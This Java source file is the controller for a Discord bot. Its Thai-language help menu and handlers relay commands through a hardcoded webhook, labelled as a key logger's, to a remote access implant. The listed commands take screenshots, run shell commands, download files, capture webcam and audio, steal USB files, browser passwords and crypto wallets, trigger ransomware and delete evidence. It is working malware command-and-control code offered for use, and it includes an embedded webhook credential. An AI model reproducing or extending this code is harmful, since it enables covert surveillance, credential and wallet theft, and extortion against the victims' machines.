import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.cache.CacheFlag;

import javax.security.auth.login.LoginException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class DiscordBot extends ListenerAdapter {

    // 🔑 อ่าน Token จาก Environment Variable (ตั้งค่าบน Railway)
    private static final String TOKEN = System.getenv("DISCORD_TOKEN");
    
    // Webhook URL ของ Key Logger
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1542458066157572188/1O-xPE2tJ2l8rCyomB8khGM3c7XsnOp3pnpF6sNQljo4_hanKRFZdiN8jRA9aiJ5a6Dj";

    public static void main(String[] args) throws LoginException, InterruptedException {
        // ตรวจสอบ Token
        if (TOKEN == null || TOKEN.isEmpty()) {
            System.err.println("❌ ERROR: DISCORD_TOKEN environment variable not set!");
            System.err.println("⚠️ กรุณาตั้งค่า DISCORD_TOKEN ใน Railway Environment Variables");
            System.exit(1);
        }

        System.out.println("=".repeat(50));
        System.out.println("🤖 กำลังเริ่ม Discord Bot (Java)...");
        System.out.println("=".repeat(50));

        JDA jda = JDABuilder.createDefault(TOKEN)
                .enableIntents(
                        GatewayIntent.MESSAGE_CONTENT,
                        GatewayIntent.GUILD_MESSAGES,
                        GatewayIntent.GUILD_MEMBERS
                )
                .enableCache(CacheFlag.MEMBER_OVERRIDES)
                .addEventListeners(new DiscordBot())
                .build();

        jda.awaitReady();

        System.out.println("=".repeat(50));
        System.out.println("✅ BOT ออนไลน์แล้ว!");
        System.out.println("📌 ชื่อ: " + jda.getSelfUser().getName());
        System.out.println("📌 ID: " + jda.getSelfUser().getId());
        System.out.println("=".repeat(50));

        jda.getPresence().setActivity(
            net.dv8tion.jda.api.entities.Activity.playing("!help | 1818")
        );
    }

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) return;

        String message = event.getMessage().getContentRaw();

        // ==================== คำสั่ง ====================
        
        if (message.equalsIgnoreCase("!ping")) {
            long latency = event.getJDA().getGatewayPing();
            event.getChannel().sendMessage("🏓 Pong! " + latency + "ms").queue();
        }
        
        else if (message.equalsIgnoreCase("!help")) {
            String helpText = """
                    📋 **รายการคำสั่งทั้งหมด:**
                    
                    **📨 ข้อความบนหน้าจอ:**
                    `!msg ข้อความ` - แสดงข้อความเต็มจอ
                    `!msg_alert ข้อความ` - แสดงพร้อมเสียงเตือน
                    `!msg_scroll ข้อความ` - แสดงข้อความวิ่ง
                    
                    **🖥️ การควบคุม:**
                    `!screenshot` - จับภาพหน้าจอ
                    `!ls C:\\\\path` - แสดงรายการไฟล์
                    `!download C:\\\\file` - ดาวน์โหลดไฟล์
                    `!cmd คำสั่ง` - รัน CMD
                    `!lock` - ล็อกหน้าจอ
                    `!unlock` - ปลดล็อกหน้าจอ
                    `!webcam` - ถ่ายรูปเว็บแคม
                    `!record` - บันทึกเสียง
                    `!map` - แสดงแผนที่
                    
                    **💾 ขโมยข้อมูล:**
                    `!usb` - ขโมยไฟล์ USB
                    `!browser` - ขโมยรหัสผ่าน
                    `!crypto` - ขโมย Crypto Wallet
                    `!ransom` - Ransomware จำลอง
                    
                    **🧹 ระบบ:**
                    `!delete_evidence` - ลบหลักฐาน
                    
                    🔑 **รหัสปลดล็อก:** `1818`
                    """;
            event.getChannel().sendMessage(helpText).queue();
        }
        
        // ==================== ส่งคำสั่งไป Webhook ====================
        
        else if (message.startsWith("!msg ")) {
            String msg = message.substring(5);
            sendWebhookCommand("msg", msg);
            event.getChannel().sendMessage("📨 กำลังส่งข้อความ...").queue();
        }
        
        else if (message.equalsIgnoreCase("!screenshot")) {
            sendWebhookCommand("screenshot", "");
            event.getChannel().sendMessage("📸 กำลังจับภาพหน้าจอ...").queue();
        }
        
        else if (message.equalsIgnoreCase("!lock")) {
            sendWebhookCommand("lock", "");
            event.getChannel().sendMessage("🔒 กำลังล็อกหน้าจอ...").queue();
        }
        
        else if (message.equalsIgnoreCase("!unlock")) {
            sendWebhookCommand("unlock", "");
            event.getChannel().sendMessage("🔓 กำลังปลดล็อก...").queue();
        }
        
        else if (message.equalsIgnoreCase("!delete_evidence")) {
            sendWebhookCommand("delete_evidence", "");
            event.getChannel().sendMessage("🧹 กำลังลบหลักฐาน...").queue();
        }
        
        else if (message.startsWith("!cmd ")) {
            String cmd = message.substring(5);
            sendWebhookCommand("cmd", cmd);
            event.getChannel().sendMessage("💻 กำลังรันคำสั่ง: `" + cmd + "`").queue();
        }
        
        else if (message.startsWith("!ls ")) {
            String path = message.substring(4);
            sendWebhookCommand("ls", path);
            event.getChannel().sendMessage("📂 กำลังแสดงไฟล์ใน: `" + path + "`").queue();
        }
        
        else if (message.startsWith("!download ")) {
            String path = message.substring(10);
            sendWebhookCommand("download", path);
            event.getChannel().sendMessage("📥 กำลังดาวน์โหลด: `" + path + "`").queue();
        }
        
        else if (message.equalsIgnoreCase("!webcam")) {
            sendWebhookCommand("webcam", "");
            event.getChannel().sendMessage("📷 กำลังเปิดเว็บแคม...").queue();
        }
        
        else if (message.equalsIgnoreCase("!record")) {
            sendWebhookCommand("record", "");
            event.getChannel().sendMessage("🎤 กำลังบันทึกเสียง...").queue();
        }
        
        else if (message.equalsIgnoreCase("!map")) {
            sendWebhookCommand("map", "");
            event.getChannel().sendMessage("🗺️ กำลังดึงตำแหน่ง...").queue();
        }
        
        else if (message.equalsIgnoreCase("!usb")) {
            sendWebhookCommand("usb", "");
            event.getChannel().sendMessage("💾 กำลังขโมยไฟล์ USB...").queue();
        }
        
        else if (message.equalsIgnoreCase("!browser")) {
            sendWebhookCommand("browser", "");
            event.getChannel().sendMessage("🔑 กำลังขโมยรหัสผ่าน...").queue();
        }
        
        else if (message.equalsIgnoreCase("!crypto")) {
            sendWebhookCommand("crypto", "");
            event.getChannel().sendMessage("💰 กำลังขโมย Crypto...").queue();
        }
        
        else if (message.equalsIgnoreCase("!ransom")) {
            sendWebhookCommand("ransom", "");
            event.getChannel().sendMessage("🔴 กำลังเปิด Ransomware...").queue();
        }
    }

    private void sendWebhookCommand(String command, String parameter) {
        try {
            String encodedParam = Base64.getEncoder().encodeToString(parameter.getBytes(StandardCharsets.UTF_8));
            
            String jsonPayload = String.format(
                "{\"content\": \"```\\n[COMMAND]\\n%s\\n%s\\n```\"}",
                command,
                encodedParam
            );
            
            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            
            int responseCode = conn.getResponseCode();
            System.out.println("📤 ส่งคำสั่ง " + command + " → " + responseCode);
            
            conn.disconnect();
        } catch (Exception e) {
            System.err.println("❌ Error: " + e.getMessage());
        }
    }
}
